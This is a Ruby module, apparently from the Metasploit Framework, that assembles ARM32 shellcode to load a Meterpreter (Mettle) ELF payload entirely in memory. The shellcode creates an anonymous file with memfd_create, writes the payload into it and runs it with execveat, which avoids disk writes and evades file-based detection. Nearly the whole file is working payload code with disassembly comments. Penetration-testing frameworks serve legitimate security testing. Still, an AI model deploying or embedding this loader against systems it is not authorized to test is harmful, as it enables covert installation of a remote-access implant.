#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
# ARM32 conventions
#  Parameters: r0-r6
#  Syscall offset: r7
#  Return Address: lr/r14

module Msf::Payload::Linux::Armle::MeterpreterLoader
  def in_memory_load(payload)
    in_memory_loader = [
      # fd = memfd_create(NULL,MFD_CLOEXEC)
      0xe3a02000, # 0x1000:	mov	r2, #0	0xe3a02000
      0xe52d2004, # 0x1004:	str	r2, [sp, #-4]!	0xe52d2004
      0xe1a0000d, # 0x1008:	mov	r0, sp	0xe1a0000d
      0xe3a01001, # 0x100c:	mov	r1, #1	0xe3a01001
      0xe3a07083, # 0x1010:	mov	r7, #0x83	0xe3a07083
      0xe28770fe, # 0x1014:	add	r7, r7, #0xfe	0xe28770fe
      0xef000000, # 0x1018:	svc	#0	0xef000000
      0xe1a03000, # 0x101c:	mov	r3, r0	0xe1a03000

      # jump to address 0x1058
      0xea00000c, # 0x1020:	b	#0x1058	0xea00000c

      # write(fd, payload length, payload pointer)
      0xe1a0100e, # 0x1024:	mov	r1, lr	0xe1a0100e
      0xe5912000, # 0x1028:	ldr	r2, [r1]	0xe5912000
      0xe2811004, # 0x102c:	add	r1, r1, #4	0xe2811004
      0xe3a07004, # 0x1030:	mov	r7, #4	0xe3a07004
      0xef000000, # 0x1034:	svc	#0	0xef000000

      # execveat(fd, null,null,null, AT_EMPTY_PATH)
      0xe1a00003, # 0x1038:	mov	r0, r3	0xe1a00003
      0xe3a02000, # 0x103c:	mov	r2, #0	0xe3a02000
      0xe52d2004, # 0x1040:	str	r2, [sp, #-4]!	0xe52d2004
      0xe1a0100d, # 0x1044:	mov	r1, sp	0xe1a0100d
      0xe3a03000, # 0x1048:	mov	r3, #0	0xe3a03000
      0xe3a04a01, # 0x104c:	mov	r4, #0x1000	0xe3a04a01
      0xe3007183, # 0x1050:	movw	r7, #0x183	0xe3007183
      0xef000000, # 0x1054:	svc	#0	0xef000000

      # jump back to the address 0x1024, address following this instruction will be stored in link register (lr)
      0xebfffff1, # 0x1058:	bl	#0x1024	0xebfffff1
      payload.length
    ].pack('V*')
    in_memory_loader
  end
end
